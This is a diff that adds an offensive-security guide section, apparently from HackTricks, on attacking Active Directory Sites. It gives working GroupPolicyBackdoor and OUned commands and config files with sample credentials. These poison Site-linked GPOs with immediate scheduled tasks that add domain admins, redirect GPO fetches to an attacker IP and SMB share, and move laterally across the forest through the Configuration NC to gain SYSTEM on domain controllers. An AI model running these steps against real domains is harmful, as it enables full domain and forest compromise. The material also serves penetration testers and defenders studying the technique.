@@ -326,6 +326,141 @@ Notes:
 - Clean up by restoring the original content/timestamps after use.
 
 
+## Abusing AD Sites: gPLink manipulation, Site ACL abuse, and Configuration NC lateral movement
+
+Active Directory Sites, Subnets, and Site Links live under the forest-wide Configuration Naming Context (NC): `CN=Sites,CN=Configuration,DC=<root>,DC=<tld>`. Sites can have Group Policies via their `gPLink` attribute. Therefore:
+- Controlling a Site-linked GPO or the Site object itself enables delivery of code to every computer in that Site, including Domain Controllers (DCs) in that Site.
+- Because Sites are in the writable, forest-replicated Configuration NC, privileged write access on any writable DC in any domain can be abused to link a GPO to a Site that affects DCs in other domains (bypasses SID filtering).
+
+Notes and timers:
+- Intra-site AD replication ~5 minutes; inter-site replication defaults to 180 minutes and is compressed. DC computer policy refresh is ~5 minutes by default.
+- Prefer operating against a DC in the same Site to avoid inter-site delays.
+
+### Enumeration and graphing (BloodHound)
+Recent BloodHound/SharpHound preview work adds Sites, Site↔Subnet/Server relationships, and control edges for `GenericAll`, `GenericWrite`, and `WriteGPLink` on Sites, plus GPO→Site `GPLink` edges. Treat Sites as High Value Targets.
+
+Check BloodHound usage here: [BloodHound & AD enumeration](../bloodhound.md)
+
+---
+
+### Attack 1 — Poison a GPO already linked to a Site
+If you can modify a GPO that is linked to a Site, inject a Computer Immediate Scheduled Task that targets only the DC(s) in that Site. On next refresh, DCs execute as SYSTEM.
+
+Tooling: GroupPolicyBackdoor.py (GPB)
+- Repo: https://github.com/synacktiv/GroupPolicyBackdoor
+- Docs: https://github.com/synacktiv/GroupPolicyBackdoor/wiki
+
+Example GPB module (target only a specific DC by name):
+```ini
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = cmd.exe
+arguments = /c "net localgroup Administrators corp.com\adove /add"
+
+[MODULEFILTERS]
+filters = [{"operator":"AND","type":"Computer Name","value":"ad01-dc.corp.com"}]
+```
+Inject and wait ≤5 minutes for refresh:
+```bash
+python3 gpb.py gpo inject -d corp.com --dc ad01-dc.corp.com -u adove -p 'Password1' \
+  -m ImmediateTask_create.ini -n "Paris_Servers_Firewall_Rules"
+```
+Cleanup (removes preferences, restores extension list/versions):
+```bash
+python3 gpb.py gpo clean -d corp.com --dc ad01-dc.corp.com -u adove -p 'Password1' -sf <state_folder>
+```
+
+---
+
+### Attack 2 — Abuse Site ACLs to alter gPLink
+If you hold `GenericAll`, `GenericWrite`, or `WriteGPLink` on a Site object, you can change its `gPLink` to deliver a malicious GPO to all Site members.
+
+2.1 Link a controlled domain GPO to a Site DN
+- Site DN lives under: `CN=<SiteName>,CN=Sites,CN=Configuration,DC=<root>,DC=<tld>`
+- Link your prepared GPO using GPB:
+```bash
+python3 gpb.py links link -d corp.com --dc ad01-dc.corp.com \
+  -o 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' \
+  -n CONTROLLED -u aacre -p 'Password1'
+```
+
+2.2 Spoofed “fake-domain” gPLink (site-wide GPO redirection)
+- Idea: add a `gPLink` entry whose LDAP path points to `DC=<fake>,DC=<root>,DC=<tld>` that you control DNS/routing for. Clients fetch GPC over LDAP and GPT over SMB from your infra.
+- Example gPLink entry value: `[LDAP://cn={GUID},cn=policies,cn=system,DC=s1n,DC=corp,DC=com;0]`
+- Tooling: OUned.py can automate:
+  - cloning a benign GPO, injecting a GPB module (e.g., Immediate Scheduled Task),
+  - rewriting `gPCFileSysPath` to `\\<attacker>\<share>`, adjusting `gPCMachineExtensionNames` (e.g., includes `{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}` for Scheduled Tasks CSE), and bumping `versionNumber`,
+  - updating the Site’s `gPLink` to the spoofed LDAP DN,
+  - serving GPT via embedded SMB and forwarding LDAP to a “fake DC” hostname.
+
+Minimal run:
+```bash
+python3 OUned.py --config config.ini
+```
+Operational notes:
+- Ensure DCs can resolve your fake domain host (e.g., `s1n.corp.com`) and reach your LDAP/SMB endpoints.
+- Run changes against a DC in the same Site to avoid default 180-minute inter-site delays.
+
+<details>
+<summary>Example OUned config (abridged)</summary>
+
+```ini
+[GENERAL]
+domain=corp.com
+containerDN=CN=NewYork,CN=Sites,CN=Configuration,DC=corp,DC=com
+username=aacre
+password=Password1
+attacker_ip=192.168.123.17
+module=ImmediateTask_create_computer.ini
+
+[LDAP]
+ldap_ip=192.168.125.138
+ldap_hostname=WIN-QGNGA6OQUNO
+ldap_username=Administrator
+ldap_password=Password1!
+
+[SMB]
+smb_mode=embedded
+share_name=synacktiv
+```
+</details>
+
+---
+
+### Attack 3 — Forest-wide lateral movement via Configuration NC (bypasses SID filtering)
+Sites belong to the writable, forest-replicated Configuration NC. Any writable DC in any domain stores a writable copy. With SYSTEM on a child domain DC you can link a child-domain GPO to a Site that contains root-domain DCs and obtain SYSTEM on them once replication and policy refresh occur.
+
+Walkthrough outline (child `dev.corp.com` → root `corp.com`):
+1) In the compromised child domain, create a malicious GPO and inject a Computer Immediate Scheduled Task targeting a root DC (use GPB).
+2) Achieve SYSTEM on a child DC (e.g., inject into “Default Domain Controllers Policy” an immediate task that runs `New-GPLink` as SYSTEM to link your GPO to `CN=<RootSite>,CN=Sites,CN=Configuration,DC=corp,DC=com`).
+3) Wait timings: ≤5 min for the child DC task; ≤5 min intra-site Config NC replication to a root DC; ≤5 min DC policy refresh on the target root DC.
+4) Verify access and clean up.
+
+Preconditions:
+- Target DCs must route/resolve to at least one DC in your compromised domain for LDAP/SMB when using spoofed GPC/GPT delivery.
+- If only transitive site links exist without routing, pivot through an adjacent Site/bridgehead first.
+
+Impact:
+- Site control ⇒ SYSTEM on DCs in that Site ⇒ quick domain compromise.
+- Cross-domain lateral movement within the forest via Configuration NC; unaffected by SID filtering.
+
+
+
+
+
+
+
+
+### Key artefacts and attributes
+- Sites container: `CN=Sites,CN=Configuration,DC=<root>,DC=<tld>`
+- Site policy linking: `gPLink` on `CN=<SiteName>,CN=Sites,...`
+- GPO attributes manipulated by tooling: `gPCFileSysPath`, `gPCMachineExtensionNames`, `versionNumber`
+- Scheduled Tasks CSE GUID commonly seen: `{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}`
+
 ## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
@@ -334,11 +469,14 @@ Notes:
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 - [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
 - [Samba – net rpc (group membership)](https://www.samba.org/)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [Synacktiv – Site Unseen: Enumerating and Attacking Active Directory Sites](https://www.synacktiv.com/en/publications/site-unseen-enumerating-and-attacking-active-directory-sites.html)
+- [GroupPolicyBackdoor.py](https://github.com/synacktiv/GroupPolicyBackdoor)
+- [OUned.py](https://github.com/synacktiv/OUned)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
